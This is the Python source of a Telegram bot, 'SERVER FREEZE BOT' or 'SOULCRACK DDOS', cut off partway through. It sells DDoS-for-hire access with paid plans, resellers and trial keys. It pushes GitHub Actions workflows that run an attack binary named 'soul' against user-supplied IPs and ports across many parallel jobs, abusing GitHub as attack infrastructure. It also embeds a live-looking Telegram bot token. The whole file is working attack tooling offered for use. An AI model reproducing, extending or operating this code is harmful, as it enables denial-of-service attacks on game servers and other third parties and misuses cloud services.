import os
import json
import logging
import threading
import time
import random
import string
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, ConversationHandler, CallbackQueryHandler
from github import Github, GithubException

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

BOT_TOKEN = "8330044393:AAFlCdOUi_B1JeNYhQHJPAZeAviJkW7G-i0"
YML_FILE_PATH = ".github/workflows/main.yml"
BINARY_FILE_NAME = "soul"
ADMIN_IDS = [8101867786]
OWNER_IDS = [8101867786]

WAITING_FOR_IP = 1
WAITING_FOR_PORT = 2
WAITING_FOR_TIME = 3
WAITING_FOR_BINARY = 4
WAITING_FOR_BROADCAST = 5
WAITING_FOR_USER_ID = 6
WAITING_FOR_DAYS = 7
WAITING_FOR_TOKEN = 8
WAITING_FOR_OWNER_ID = 9
WAITING_FOR_OWNER_USERNAME = 10
WAITING_FOR_RESELLER_ID = 11
WAITING_FOR_RESELLER_CREDITS = 12
WAITING_FOR_RESELLER_USERNAME = 13
WAITING_FOR_REMOVE_ID = 14
WAITING_FOR_COOLDOWN = 15
WAITING_FOR_MAX_ATTACKS = 16
WAITING_FOR_TRIAL_HOURS = 17
WAITING_FOR_REDEEM_KEY = 18

current_attack = None
attack_lock = threading.Lock()
cooldown_until = 0
COOLDOWN_DURATION = 40
MAINTENANCE_MODE = False
MAX_ATTACKS = 40
user_attack_counts = {}
user_states = {}

USER_PRICES = {
    "1": 120,
    "2": 240,
    "3": 360,
    "4": 450,
    "7": 650
}

RESELLER_PRICES = {
    "1": 150,
    "2": 250,
    "3": 300,
    "4": 400,
    "7": 550
}

def load_users():
    try:
        with open('users.json', 'r') as f:
            users_data = json.load(f)
            if not users_data:
                initial_users = ADMIN_IDS.copy()
                save_users(initial_users)
                return set(initial_users)
            return set(users_data)
    except FileNotFoundError:
        initial_users = ADMIN_IDS.copy()
        save_users(initial_users)
        return set(initial_users)

def save_users(users):
    with open('users.json', 'w') as f:
        json.dump(list(users), f)

def load_pending_users():
    try:
        with open('pending_users.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return []

def save_pending_users(pending_users):
    with open('pending_users.json', 'w') as f:
        json.dump(pending_users, f, indent=2)

def load_approved_users():
    try:
        with open('approved_users.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_approved_users(approved_users):
    with open('approved_users.json', 'w') as f:
        json.dump(approved_users, f, indent=2)

def load_owners():
    try:
        with open('owners.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        owners = {}
        for admin_id in ADMIN_IDS:
            owners[str(admin_id)] = {
                "username": f"owner_{admin_id}",
                "added_by": "system",
                "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
                "is_primary": True
            }
        save_owners(owners)
        return owners

def save_owners(owners):
    with open('owners.json', 'w') as f:
        json.dump(owners, f, indent=2)

def load_admins():
    try:
        with open('admins.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_admins(admins):
    with open('admins.json', 'w') as f:
        json.dump(admins, f, indent=2)

def load_groups():
    try:
        with open('groups.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_groups(groups):
    with open('groups.json', 'w') as f:
        json.dump(groups, f, indent=2)

def load_resellers():
    try:
        with open('resellers.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_resellers(resellers):
    with open('resellers.json', 'w') as f:
        json.dump(resellers, f, indent=2)

def load_github_tokens():
    try:
        with open('github_tokens.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return []

def save_github_tokens(tokens):
    with open('github_tokens.json', 'w') as f:
        json.dump(tokens, f, indent=2)

def load_attack_state():
    try:
        with open('attack_state.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {"current_attack": None, "cooldown_until": 0}

def save_attack_state():
    state = {
        "current_attack": current_attack,
        "cooldown_until": cooldown_until
    }
    with open('attack_state.json', 'w') as f:
        json.dump(state, f, indent=2)

def load_maintenance_mode():
    try:
        with open('maintenance.json', 'r') as f:
            data = json.load(f)
            return data.get("maintenance", False)
    except FileNotFoundError:
        return False

def save_maintenance_mode(mode):
    with open('maintenance.json', 'w') as f:
        json.dump({"maintenance": mode}, f, indent=2)

def load_cooldown():
    try:
        with open('cooldown.json', 'r') as f:
            data = json.load(f)
            return data.get("cooldown", 40)
    except FileNotFoundError:
        return 40

def save_cooldown(duration):
    with open('cooldown.json', 'w') as f:
        json.dump({"cooldown": duration}, f, indent=2)

def load_max_attacks():
    try:
        with open('max_attacks.json', 'r') as f:
            data = json.load(f)
            return data.get("max_attacks", 40)
    except FileNotFoundError:
        return 40

def save_max_attacks(max_attacks):
    with open('max_attacks.json', 'w') as f:
        json.dump({"max_attacks": max_attacks}, f, indent=2)

def load_trial_keys():
    try:
        with open('trial_keys.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_trial_keys(keys):
    with open('trial_keys.json', 'w') as f:
        json.dump(keys, f, indent=2)

def load_user_attack_counts():
    try:
        with open('user_attack_counts.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_user_attack_counts(counts):
    with open('user_attack_counts.json', 'w') as f:
        json.dump(counts, f, indent=2)

authorized_users = load_users()
pending_users = load_pending_users()
approved_users = load_approved_users()
owners = load_owners()
admins = load_admins()
groups = load_groups()
resellers = load_resellers()
github_tokens = load_github_tokens()
MAINTENANCE_MODE = load_maintenance_mode()
COOLDOWN_DURATION = load_cooldown()
MAX_ATTACKS = load_max_attacks()
user_attack_counts = load_user_attack_counts()
trial_keys = load_trial_keys()

attack_state = load_attack_state()
current_attack = attack_state.get("current_attack")
cooldown_until = attack_state.get("cooldown_until", 0)

def is_primary_owner(user_id):
    user_id_str = str(user_id)
    if user_id_str in owners:
        return owners[user_id_str].get("is_primary", False)
    return False

def is_owner(user_id):
    return str(user_id) in owners

def is_admin(user_id):
    return str(user_id) in admins

def is_reseller(user_id):
    return str(user_id) in resellers

def is_approved_user(user_id):
    user_id_str = str(user_id)
    if user_id_str in approved_users:
        expiry_timestamp = approved_users[user_id_str]['expiry']
        if expiry_timestamp == "LIFETIME":
            return True
        current_time = time.time()
        if current_time < expiry_timestamp:
            return True
        else:
            del approved_users[user_id_str]
            save_approved_users(approved_users)
    return False

def can_user_attack(user_id):
    return (is_owner(user_id) or is_admin(user_id) or is_reseller(user_id) or is_approved_user(user_id)) and not MAINTENANCE_MODE

def can_start_attack(user_id):
    global current_attack, cooldown_until
    if MAINTENANCE_MODE:
        return False, "⚠️ MAINTENANCE MODE\nBot is under maintenance."
    user_id_str = str(user_id)
    current_count = user_attack_counts.get(user_id_str, 0)
    if current_count >= MAX_ATTACKS:
        return False, f"⚠️ MAXIMUM ATTACK LIMIT REACHED\nYou have used all {MAX_ATTACKS} attacks. Contact admin."
    if current_attack is not None:
        return False, "⚠️ ATTACK ALREADY RUNNING\nPlease wait for current attack to finish."
    current_time = time.time()
    if current_time < cooldown_until:
        remaining_time = int(cooldown_until - current_time)
        return False, f"⏳ COOLDOWN REMAINING\nPlease wait {remaining_time} seconds."
    return True, "✅ Ready to start attack"

def get_attack_method(ip):
    if ip.startswith('91'):
        return "VC FLOOD", "GAME"
    elif ip.startswith(('15', '96')):
        return None, "⚠️ Invalid IP - IPs starting with '15' or '96' not allowed"
    else:
        return "BGMI FLOOD", "GAME"

def is_valid_ip(ip):
    return not ip.startswith(('15', '96'))

def start_attack(ip, port, time_val, user_id, method):
    global current_attack
    current_attack = {
        "ip": ip,
        "port": port,
        "time": time_val,
        "user_id": user_id,
        "method": method,
        "start_time": time.time(),
        "estimated_end_time": time.time() + int(time_val)
    }
    save_attack_state()
    user_id_str = str(user_id)
    user_attack_counts[user_id_str] = user_attack_counts.get(user_id_str, 0) + 1
    save_user_attack_counts(user_attack_counts)

def finish_attack():
    global current_attack, cooldown_until
    current_attack = None
    cooldown_until = time.time() + COOLDOWN_DURATION
    save_attack_state()

def stop_attack():
    global current_attack, cooldown_until
    current_attack = None
    cooldown_until = time.time() + COOLDOWN_DURATION
    save_attack_state()

def get_attack_status():
    global current_attack, cooldown_until
    if current_attack is not None:
        current_time = time.time()
        elapsed = int(current_time - current_attack['start_time'])
        remaining = max(0, int(current_attack['estimated_end_time'] - current_time))
        return {
            "status": "running",
            "attack": current_attack,
            "elapsed": elapsed,
            "remaining": remaining
        }
    current_time = time.time()
    if current_time < cooldown_until:
        remaining_cooldown = int(cooldown_until - current_time)
        return {
            "status": "cooldown",
            "remaining_cooldown": remaining_cooldown
        }
    return {"status": "ready"}

def generate_trial_key(hours):
    key = f"TRL-{''.join(random.choices(string.ascii_uppercase + string.digits, k=4))}-{''.join(random.choices(string.ascii_uppercase + string.digits, k=4))}-{''.join(random.choices(string.ascii_uppercase + string.digits, k=4))}"
    expiry = time.time() + (hours * 3600)
    trial_keys[key] = {
        "hours": hours,
        "expiry": expiry,
        "used": False,
        "used_by": None,
        "created_at": time.time(),
        "created_by": "system"
    }
    save_trial_keys(trial_keys)
    return key

def redeem_trial_key(key, user_id):
    user_id_str = str(user_id)
    if key not in trial_keys:
        return False, "Invalid key"
    key_data = trial_keys[key]
    if key_data["used"]:
        return False, "Key already used"
    if time.time() > key_data["expiry"]:
        return False, "Key expired"
    key_data["used"] = True
    key_data["used_by"] = user_id_str
    key_data["used_at"] = time.time()
    trial_keys[key] = key_data
    save_trial_keys(trial_keys)
    expiry = time.time() + (key_data["hours"] * 3600)
    approved_users[user_id_str] = {
        "username": f"user_{user_id}",
        "added_by": "trial_key",
        "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
        "expiry": expiry,
        "days": key_data["hours"] / 24,
        "trial": True
    }
    save_approved_users(approved_users)
    return True, f"✅ Trial access activated for {key_data['hours']} hours!"

def create_repository(token, repo_name="soulcrack-tg"):
    try:
        g = Github(token)
        user = g.get_user()
        try:
            repo = user.get_repo(repo_name)
            return repo, False
        except GithubException:
            repo = user.create_repo(
                repo_name,
                description="SOULCRACK DDOS Bot Repository",
                private=False,
                auto_init=False
            )
            return repo, True
    except Exception as e:
        raise Exception(f"Failed to create repository: {e}")

def update_yml_file(token, repo_name, ip, port, time_val, method):
    yml_content = f"""name: soul Attack
on: [push]

jobs:
  soul:
    runs-on: ubuntu-22.04
    strategy:
      matrix:
        n: [1,2,3,4,5,6,7,8,9,10,
            11,12,13,14,15]
    steps:
    - uses: actions/checkout@v3
    - run: chmod +x soul
    - run: sudo ./soul {ip} {port} {time_val}
"""
    try:
        g = Github(token)
        repo = g.get_repo(repo_name)
        try:
            file_content = repo.get_contents(YML_FILE_PATH)
            repo.update_file(
                YML_FILE_PATH,
                f"Update attack parameters - {ip}:{port} ({method})",
                yml_content,
                file_content.sha
            )
            logger.info(f"✅ Updated configuration for {repo_name}")
        except:
            repo.create_file(
                YML_FILE_PATH,
                f"Create attack parameters - {ip}:{port} ({method})",
                yml_content
            )
            logger.info(f"✅ Created configuration for {repo_name}")
        return True
    except Exception as e:
        logger.error(f"❌ Error for {repo_name}: {e}")
        return False

def instant_stop_all_jobs(token, repo_name):
    try:
        g = Github(token)
        repo = g.get_repo(repo_name)
        running_statuses = ['queued', 'in_progress', 'pending']
        total_cancelled = 0
        for status in running_statuses:
            try:
                workflows = repo.get_workflow_runs(status=status)
                for workflow in workflows:
                    try:
                        workflow.cancel()
                        total_cancelled += 1
                        logger.info(f"✅ INSTANT STOP: Cancelled {status} workflow {workflow.id}")
                    except Exception as e:
                        logger.error(f"❌ Error cancelling workflow {workflow.id}: {e}")
            except Exception as e:
                logger.error(f"❌ Error getting {status} workflows: {e}")
        return total_cancelled
    except Exception as e:
        logger.error(f"❌ Error accessing {repo_name}: {e}")
        return 0

def get_main_keyboard(user_id):
    keyboard = []
    if can_user_attack(user_id):
        keyboard.append([
            InlineKeyboardButton("🚀 Launch Attack", callback_data="launch_attack"),
            InlineKeyboardButton("📊 Check Status", callback_data="check_status")
        ])
        keyboard.append([
            InlineKeyboardButton("🛑 Stop Attack", callback_data="stop_attack"),
            InlineKeyboardButton("👤 My Access", callback_data="my_access")
        ])
    if is_owner(user_id) or is_admin(user_id):
        keyboard.append([
            InlineKeyboardButton("👥 User Management", callback_data="user_management"),
            InlineKeyboardButton("⚙️ Bot Settings", callback_data="bot_settings")
        ])
    if is_owner(user_id):
        keyboard.append([
            InlineKeyboardButton("👑 Owner Panel", callback_data="owner_panel"),
            InlineKeyboardButton("🔧 Token Management", callback_data="token_management")
        ])
    keyboard.append([InlineKeyboardButton("❓ Help", callback_data="help")])
    return InlineKeyboardMarkup(keyboard)

def get_user_management_keyboard():
    keyboard = [
        [InlineKeyboardButton("➕ Add User", callback_data="add_user"),
         InlineKeyboardButton("➖ Remove User", callback_data="remove_user")],
        [InlineKeyboardButton("📋 Users List", callback_data="users_list"),
         InlineKeyboardButton("⏳ Pending List", callback_data="pending_list")],
        [InlineKeyboardButton("🔑 Generate Trial Key", callback_data="gen_trial_key")],
        [InlineKeyboardButton("🔙 Back to Main", callback_data="back_to_main")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_bot_settings_keyboard():
    keyboard = [
        [InlineKeyboardButton("⏱️ Set Cooldown", callback_data="set_cooldown"),
         InlineKeyboardButton("🎯 Set Max Attacks", callback_data="set_max_attacks")],
        [InlineKeyboardButton("🔧 Maintenance Mode", callback_data="toggle_maintenance")],
        [InlineKeyboardButton("📢 Broadcast Message", callback_data="broadcast")],
        [InlineKeyboardButton("🔙 Back to Main", callback_data="back_to_main")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_owner_panel_keyboard():
    keyboard = [
        [InlineKeyboardButton("👑 Owner List", callback_data="owner_list"),
         InlineKeyboardButton("🛡️ Admin List", callback_data="admin_list")],
        [InlineKeyboardButton("💰 Reseller List", callback_data="reseller_list")],
        [InlineKeyboardButton("➕ Add Owner", callback_data="add_owner"),
         InlineKeyboardButton("➕ Add Reseller", callback_data="add_reseller")],
        [InlineKeyboardButton("🔙 Back to Main", callback_data="back_to_main")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_token_management_keyboard():
    keyboard = [
        [InlineKeyboardButton("➕ Add Token", callback_data="add_token"),
         InlineKeyboardButton("📋 View Tokens", callback_data="view_tokens")],
        [InlineKeyboardButton("🗑️ Remove Token", callback_data="remove_token"),
         InlineKeyboardButton("🧹 Remove Expired", callback_data="remove_expired_tokens")],
        [InlineKeyboardButton("📤 Upload Binary", callback_data="upload_binary")],
        [InlineKeyboardButton("🔙 Back to Main", callback_data="back_to_main")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_cancel_keyboard():
    keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="cancel_operation")]]
    return InlineKeyboardMarkup(keyboard)

def get_back_keyboard():
    keyboard = [[InlineKeyboardButton("🔙 Back to Main", callback_data="back_to_main")]]
    return InlineKeyboardMarkup(keyboard)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if MAINTENANCE_MODE and not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text(
            "🔧 MAINTENANCE MODE\nBot is under maintenance.\nPlease wait until it's back."
        )
        return
    if not can_user_attack(user_id):
        user_exists = False
        for user in pending_users:
            if str(user['user_id']) == str(user_id):
                user_exists = True
                break
        if not user_exists:
            pending_users.append({
                "user_id": user_id,
                "username": update.effective_user.username or f"user_{user_id}",
                "request_date": time.strftime("%Y-%m-%d %H:%M:%S")
            })
            save_pending_users(pending_users)
            for owner_id in owners.keys():
                try:
                    await context.bot.send_message(
                        chat_id=int(owner_id),
                        text=f"📥 NEW ACCESS REQUEST\n\nUser: @{update.effective_user.username or 'No username'}\nID: {user_id}\n\nUse User Management to approve."
                    )
                except:
                    pass
        keyboard = [[InlineKeyboardButton("🔄 Check Status", callback_data="check_approval")]]
        await update.message.reply_text(
            f"📋 ACCESS REQUEST SENT\n\nYour access request has been sent to admin.\nPlease wait for approval.\n\nYour ID: {user_id}",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        return
    if is_owner(user_id):
        role = "👑 PRIMARY OWNER" if is_primary_owner(user_id) else "👑 OWNER"
    elif is_admin(user_id):
        role = "🛡️ ADMIN"
    elif is_reseller(user_id):
        role = "💰 RESELLER"
    else:
        role = "👤 APPROVED USER"
    user_id_str = str(user_id)
    current_attacks = user_attack_counts.get(user_id_str, 0)
    remaining_attacks = MAX_ATTACKS - current_attacks
    attack_status = get_attack_status()
    status_text = ""
    if attack_status["status"] == "running":
        attack = attack_status["attack"]
        status_text = f"\n\n🔥 ATTACK RUNNING\nTarget: {attack['ip']}:{attack['port']}\nRemaining: {attack_status['remaining']}s"
    elif attack_status["status"] == "cooldown":
        status_text = f"\n\n⏳ Cooldown: {attack_status['remaining_cooldown']}s"
    welcome_text = f"""🤖 SERVER FREEZE BOT 🤖

{role}

🎯 Remaining Attacks: {remaining_attacks}/{MAX_ATTACKS}
⏱️ Cooldown: {COOLDOWN_DURATION}s after attack{status_text}

Use buttons to continue..."""
    await update.message.reply_text(
        welcome_text,
        reply_markup=get_main_keyboard(user_id)
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    data = query.data
    if data == "back_to_main":
        if is_owner(user_id):
            role = "👑 PRIMARY OWNER" if is_primary_owner(user_id) else "👑 OWNER"
        elif is_admin(user_id):
            role = "🛡️ ADMIN"
        elif is_reseller(user_id):
            role = "💰 RESELLER"
        else:
            role = "👤 APPROVED USER"
        user_id_str = str(user_id)
        current_attacks = user_attack_counts.get(user_id_str, 0)
        remaining_attacks = MAX_ATTACKS - current_attacks
        await query.edit_message_text(
            f"🤖 SERVER FREEZE BOT 🤖\n\n{role}\n\n🎯 Remaining: {remaining_attacks}/{MAX_ATTACKS}\n\nUse buttons to continue...",
            reply_markup=get_main_keyboard(user_id)
        )
    elif data == "launch_attack":
        await handle_launch_attack(query, context)
    elif data == "check_status":
        await handle_check_status(query, context)
    elif data == "stop_attack":
        await handle_stop_attack(query, context)
    elif data == "my_access":
        await handle_my_access(query, context)
    elif data == "user_management":
        await handle_user_management(query, context)
    elif data == "bot_settings":
        await handle_bot_settings(query, context)
    elif data == "owner_panel":
        await handle_owner_panel(query, context)
    elif data == "token_management":
        await handle_token_management(query, context)
    elif data == "help":
        await handle_help(query, context)
    elif data == "add_user":
        await handle_add_user_start(query, context)
    elif data == "remove_user":
        await handle_remove_user_start(query, context)
    elif data == "users_list":
        await handle_users_list(query, context)
    elif data == "pending_list":
        await handle_pending_list(query, context)
    elif data == "gen_trial_key":
        await handle_gen_trial_key_start(query, context)
    elif data == "set_cooldown":
        await handle_set_cooldown_start(query, context)
    elif data == "set_max_attacks":
        await handle_set_max_attacks_start(query, context)
    elif data == "toggle_maintenance":
        await handle_toggle_maintenance(query, context)
    elif data == "broadcast":
        await handle_broadcast_start(query, context)
    elif data == "owner_list":
        await handle_owner_list(query, context)
    elif data == "admin_list":
        await handle_admin_list(query, context)
    elif data == "reseller_list":
        await handle_reseller_list(query, context)
    elif data == "add_owner":
        await handle_add_owner_start(query, context)
    elif data == "add_reseller":
        await handle_add_reseller_start(query, context)
    elif data == "add_token":
        await handle_add_token_start(query, context)
    elif data == "view_tokens":
        await handle_view_tokens(query, context)
    elif data == "remove_token":
        await handle_remove_token(query, context)
    elif data == "remove_expired_tokens":
        await handle_remove_expired_tokens(query, context)
    elif data == "upload_binary":
        await handle_upload_binary_start(query, context)
    elif data == "cancel_operation":
        user_states[user_id] = None
        await query.edit_message_text(
            "❌ Operation cancelled.",
            reply_markup=get_back_keyboard()
        )
    elif data == "check_approval":
        if can_user_attack(user_id):
            await query.edit_message_text(
                "✅ Your access has been approved!\nUse /start to access the bot."
            )
        else:
            await query.edit_message_text(
                "⏳ Your request is still pending.\nPlease wait for admin approval.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔄 Check Again", callback_data="check_approval")]])
        )

async def handle_launch_attack(query, context):
    user_id = query.from_user.id
    if not can_user_attack(user_id):
        await query.edit_message_text(
            "⚠️ ACCESS DENIED\nYou are not authorized to attack.",
            reply_markup=get_back_keyboard()
        )
        return
    can_start, message = can_start_attack(user_id)
    if not can_start:
        await query.edit_message_text(
            message,
            reply_markup=get_back_keyboard()
        )
        return
    if not github_tokens:
        await query.edit_message_text(
            "❌ NO SERVERS AVAILABLE\nNo servers configured. Contact admin.",
            reply_markup=get_back_keyboard()
        )
        return
    user_states[user_id] = {"state": WAITING_FOR_IP}
    await query.edit_message_text(
        "🎯 LAUNCH ATTACK\n\nMethod: BGMI FLOOD\nCooldown: 40s after attack\nRemaining: 98/100\n\nPlease enter TARGET IP:",
        reply_markup=get_cancel_keyboard()
    )

async def handle_check_status(query, context):
    user_id = query.from_user.id
    if not can_user_attack(user_id):
        await query.edit_message_text(
            "⚠️ ACCESS DENIED",
            reply_markup=get_back_keyboard()
        )
        return
    attack_status = get_attack_status()
    if attack_status["status"] == "running":
        attack = attack_status["attack"]
        message = f"🔥 ATTACK RUNNING\n\nTarget: {attack['ip']}:{attack['port']}\nMethod: {attack['method']}\nElapsed: {attack_status['elapsed']}s\nRemaining: {attack_status['remaining']}s"
    elif attack_status["status"] == "cooldown":
        message = f"⏳ COOLDOWN\n\nRemaining: {attack_status['remaining_cooldown']}s\nNext attack in: {attack_status['remaining_cooldown']}s"
    else:
        message = "✅ READY\n\nNo attack running.\nYou can start a new attack."
    await query.edit_message_text(
        message,
        reply_markup=get_back_keyboard()
    )

async def handle_stop_attack(query, context):
    user_id = query.from_user.id
    if not can_user_attack(user_id):
        await query.edit_message_text(
            "⚠️ ACCESS DENIED",
            reply_markup=get_back_keyboard()
        )
        return
    attack_status = get_attack_status()
    if attack_status["status"] != "running":
        await query.edit_message_text(
            "❌ NO ACTIVE ATTACK\nNo attack is running.",
            reply_markup=get_back_keyboard()
        )
        return
    if not github_tokens:
        await query.edit_message_text(
            "❌ NO SERVERS AVAILABLE",
            reply_markup=get_back_keyboard()
        )
        return
    await query.edit_message_text("🛑 STOPPING ATTACK...")
    total_stopped = 0
    success_count = 0
    threads = []
    results = []
    def stop_single_token(token_data):
        try:
            stopped = instant_stop_all_jobs(token_data['token'], token_data['repo'])
            results.append((token_data['username'], stopped))
        except Exception as e:
            results.append((token_data['username'], 0))
    for token_data in github_tokens:
        thread = threading.Thread(target=stop_single_token, args=(token_data,))
        threads.append(thread)
        thread.start()
    for thread in threads:
        thread.join()
    for username, stopped in results:
        total_stopped += stopped
        if stopped > 0:
            success_count += 1
    stop_attack()
    message = f"🛑 ATTACK STOPPED\n\n✅ Workflows cancelled: {total_stopped}\n✅ Servers: {success_count}/{len(github_tokens)}\n⏳ Cooldown: {COOLDOWN_DURATION}s"
    await query.edit_message_text(
        message,
        reply_markup=get_back_keyboard()
    )

async def handle_my_access(query, context):
    user_id = query.from_user.id
    if is_owner(user_id):
        role = "👑 PRIMARY OWNER" if is_primary_owner(user_id) else "👑 OWNER"
        expiry = "LIFETIME"
    elif is_admin(user_id):
        role = "🛡️ ADMIN"
        expiry = "LIFETIME"
    elif is_reseller(user_id):
        role = "💰 RESELLER"
        reseller_data = resellers.get(str(user_id), {})
        expiry = reseller_data.get('expiry', '?')
        if expiry != 'LIFETIME':
            try:
                expiry_time = float(expiry)
                if time.time() > expiry_time:
                    expiry = "EXPIRED"
                else:
                    expiry = time.strftime("%Y-%m-%d", time.localtime(expiry_time))
            except:
                pass
    elif is_approved_user(user_id):
        role = "👤 APPROVED USER"
        user_data = approved_users.get(str(user_id), {})
        expiry = user_data.get('expiry', '?')
        if expiry != 'LIFETIME':
            try:
                expiry_time = float(expiry)
                if time.time() > expiry_time:
                    expiry = "EXPIRED"
                else:
                    expiry = time.strftime("%Y-%m-%d", time.localtime(expiry_time))
            except:
                pass
    else:
        role = "⏳ PENDING"
        expiry = "Waiting for approval"
    user_id_str = str(user_id)
    current_attacks = user_attack_counts.get(user_id_str, 0)
    remaining_attacks = MAX_ATTACKS - current_attacks
    await query.edit_message_text(
        f"🔐 YOUR ACCESS INFO\n\n• Role: {role}\n• User ID: {user_id}\n• Username: @{query.from_user.username or 'No username'}\n• Expiry: {expiry}\n• Remaining Attacks: {remaining_attacks}/{MAX_ATTACKS}\n\nAttack Access: {'✅ YES' if can_user_attack(user_id) else '❌ NO'}",
        reply_markup=get_back_keyboard()
    )

async def handle_user_management(query, context):
    user_id = query.from_user.id
    if not is_owner(user_id) and not is_admin(user_id):
        await query.edit_message_text(
            "⚠️ ACCESS DENIED\nAdmin access required.",
            reply_markup=get_back_keyboard()
        )
        return
    await query.edit_message_text(
        "👥 USER MANAGEMENT\n\nManage bot users and access.",
        reply_markup=get_user_management_keyboard()
    )

async def handle_bot_settings(query, context):
    user_id = query.from_user.id
    if not is_owner(user_id) and not is_admin(user_id):
        await query.edit_message_text(
            "⚠️ ACCESS DENIED\nAdmin access required.",
            reply_markup=get_back_keyboard()
        )
        return
    await query.edit_message_text(
        f"⚙️ BOT SETTINGS\n\nCurrent Settings:\n• Cooldown: {COOLDOWN_DURATION}s\n• Max Attacks: {MAX_ATTACKS}\n• Maintenance: {'ON' if MAINTENANCE_MODE else 'OFF'}",
        reply_markup=get_bot_settings_keyboard()
    )

async def handle_owner_panel(query, context):
    user_id = query.from_user.id
    if not is_owner(user_id):
        await query.edit_message_text(
            "⚠️ ACCESS DENIED\nOwner access required.",
            reply_markup=get_back_keyboard()
        )
        return
    await query.edit_message_text(
        "👑 OWNER PANEL\n\nManage owners, admins, and resellers.",
        reply_markup=get_owner_panel_keyboard()
    )

async def handle_token_management(query, context):
    user_id = query.from_user.id
    if not is_owner(user_id):
        await query.edit_message_text(
            "⚠️ ACCESS DENIED\nOwner access required.",
            reply_markup=get_back_keyboard()
        )
        return
    await query.edit_message_text(
        f"🔧 TOKEN MANAGEMENT\n\nActive Servers: {len(github_tokens)}",
        reply_markup=get_token_management_keyboard()
    )

async def handle_help(query, context):
    user_id = query.from_user.id
    if is_owner(user_id) or is_admin(user_id):
        help_text = """❓ HELP - AVAILABLE FEATURES

FOR ALL USERS:
• Launch Attack - Start DDOS attack
• Check Status - View attack status
• Stop Attack - Stop running attack
• My Access - Check your access info

ADMIN FEATURES:
• User Management - Add/remove users
• Bot Settings - Configure bot
• Generate Trial Keys

OWNER FEATURES:
• Owner Panel - Manage staff
• Token Management - Manage servers
• Upload Binary - Update attack binary

Use buttons to navigate."""
    else:
        help_text = """❓ HELP - AVAILABLE FEATURES

• Launch Attack - Start DDOS attack
• Check Status - View attack status
• Stop Attack - Stop running attack
• My Access - Check access info

Need access? Contact admin.
Use buttons to navigate."""
    await query.edit_message_text(
        help_text,
        reply_markup=get_back_keyboard()
    )

async def handle_add_user_start(query, context):
    user_id = query.from_user.id
    user_states[user_id] = {"state": WAITING_FOR_USER_ID, "action": "add_user"}
    await query.edit_message_text(
        "➕ ADD USER\n\nPlease enter User ID:",
        reply_markup=get_cancel_keyboard()
    )

async def handle_remove_user_start(query, context):
    user_id = query.from_user.id
    user_states[user_id] = {"state": WAITING_FOR_REMOVE_ID}
    await query.edit_message_text(
        "➖ REMOVE USER\n\nPlease enter User ID to remove:",
        reply_markup=get_cancel_keyboard()
            )

async def handle_users_list(query, context):
    if not approved_users:
        await query.edit_message_text(
            "📭 No approved users",
            reply_markup=get_back_keyboard()
        )
        return
    users_list = "👤 APPROVED USERS LIST\n\n"
    count = 1
    for uid, user_info in list(approved_users.items())[:10]:
        username = user_info.get('username', f'user_{uid}')
        days = user_info.get('days', '?')
        expiry = user_info.get('expiry', 'LIFETIME')
        if expiry == "LIFETIME":
            remaining = "LIFETIME"
        else:
            try:
                expiry_time = float(expiry)
                current_time = time.time()
                if current_time > expiry_time:
                    remaining = "EXPIRED"
                else:
                    days_left = int((expiry_time - current_time) / (24 * 3600))
                    remaining = f"{days_left}d"
            except:
                remaining = "UNKNOWN"
        users_list += f"{count}. {uid} - @{username}\n   Days: {days} | Rem: {remaining}\n\n"
        count += 1
    users_list += f"📊 Total: {len(approved_users)}"
    await query.edit_message_text(
        users_list,
        reply_markup=get_back_keyboard()
    )

async def handle_pending_list(query, context):
    if not pending_users:
        await query.edit_message_text(
            "📭 No pending requests",
            reply_markup=get_back_keyboard()
        )
        return
    pending_list = "⏳ PENDING REQUESTS\n\n"
    for user in pending_users[:10]:
        pending_list += f"• {user['user_id']} - @{user['username']}\n"
    await query.edit_message_text(
        pending_list,
        reply_markup=get_back_keyboard()
    )

async def handle_gen_trial_key_start(query, context):
    user_id = query.from_user.id
    user_states[user_id] = {"state": WAITING_FOR_TRIAL_HOURS}
    await query.edit_message_text(
        "🔑 GENERATE TRIAL KEY\n\nPlease enter duration in hours (1-720):",
        reply_markup=get_cancel_keyboard()
    )

async def handle_set_cooldown_start(query, context):
    user_id = query.from_user.id
    user_states[user_id] = {"state": WAITING_FOR_COOLDOWN}
    await query.edit_message_text(
        f"⏱️ SET COOLDOWN\n\nCurrent: {COOLDOWN_DURATION}s\n\nEnter new cooldown in seconds:",
        reply_markup=get_cancel_keyboard()
    )

async def handle_set_max_attacks_start(query, context):
    user_id = query.from_user.id
    user_states[user_id] = {"state": WAITING_FOR_MAX_ATTACKS}
    await query.edit_message_text(
        f"🎯 SET MAX ATTACKS\n\nCurrent: {MAX_ATTACKS}\n\nEnter new maximum attacks:",
        reply_markup=get_cancel_keyboard()
    )

async def handle_toggle_maintenance(query, context):
    global MAINTENANCE_MODE
    user_id = query.from_user.id
    if not is_owner(user_id):
        await query.edit_message_text(
            "⚠️ ACCESS DENIED",
